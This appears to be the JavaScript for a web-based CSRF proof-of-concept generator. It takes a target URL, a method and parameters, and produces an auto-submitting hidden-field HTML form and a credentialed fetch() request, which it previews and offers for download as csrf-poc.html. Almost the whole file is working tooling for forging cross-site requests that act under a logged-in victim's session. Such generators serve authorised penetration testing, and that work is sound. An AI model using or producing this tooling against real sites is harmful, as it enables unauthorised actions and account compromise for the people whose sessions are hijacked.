document.addEventListener('DOMContentLoaded', function () {
  // Tab switch
  document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('.tab, .tab-content').forEach(el => el.classList.remove('active'));
      tab.classList.add('active');
      document.getElementById(tab.getAttribute('data-tab') + 'Tab').classList.add('active');
    });
  });

  // Copy to clipboard
  document.querySelectorAll('.copy-btn').forEach(btn => {
    btn.addEventListener('click', function () {
      const codeBlock = this.parentElement.querySelector('pre');
      navigator.clipboard.writeText(codeBlock.textContent);
      const originalText = this.textContent;
      this.textContent = 'Copied!';
      setTimeout(() => (this.textContent = originalText), 2000);
    });
  });

  // Generate PoC
  document.getElementById('csrfForm').addEventListener('submit', function (e) {
    e.preventDefault();
    generateCsrfPoc();
  });

  // Download button
  document.getElementById('downloadBtn').addEventListener('click', function () {
    const htmlContent = document.getElementById('htmlCode').textContent;
    const blob = new Blob([htmlContent], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'csrf-poc.html';
    a.click();
    URL.revokeObjectURL(url);
  });
});

function generateCsrfPoc() {
  const targetUrl = document.getElementById('targetUrl').value.trim();
  const method = document.getElementById('method').value;
  const autoSubmit = document.getElementById('autoSubmit').value === 'true';

  // Parse parameters
  const paramLines = document.getElementById('parameters').value.split('\n');
  const params = {};
  paramLines.forEach(line => {
    if (line.trim()) {
      const [key, ...rest] = line.split('=');
      if (key && rest.length) {
        params[key.trim()] = rest.join('=').trim();
      }
    }
  });

  // HTML PoC
  let htmlPoc = `<!DOCTYPE html>\n<html>\n<head>\n  <title>CSRF PoC</title>\n`;
  if (autoSubmit) htmlPoc += `<script>window.onload=function(){document.forms[0].submit()}</script>\n`;
  htmlPoc += `</head>\n<body>\n  <form action="${targetUrl}" method="${method}">\n`;
  for (const [key, value] of Object.entries(params)) {
    htmlPoc += `    <input type="hidden" name="${escapeHtml(key)}" value="${escapeHtml(value)}">\n`;
  }
  htmlPoc += `  </form>\n</body>\n</html>`;

  document.getElementById('htmlCode').textContent = htmlPoc;
  document.getElementById('preview').srcdoc = htmlPoc;

  // JS PoC
  let jsPoc = `// CSRF PoC using JavaScript\n`;
  if (method === 'GET') {
    const query = Object.entries(params).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
    jsPoc += `fetch('${targetUrl}${targetUrl.includes('?') ? '&' : '?'}${query}', {\n  method: 'GET',\n  credentials: 'include'\n});`;
  } else {
    const body = Object.entries(params).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
    jsPoc += `fetch('${targetUrl}', {\n  method: 'POST',\n  headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n  body: '${body}',\n  credentials: 'include'\n});`;
  }

  document.getElementById('jsCode').textContent = jsPoc;
  document.getElementById('resultContainer').classList.remove('hidden');
}

function escapeHtml(text) {
  return text.replace(/&/g, "&amp;")
             .replace(/</g, "&lt;")
             .replace(/>/g, "&gt;")
             .replace(/"/g, "&quot;")
             .replace(/'/g, "&#039;");
}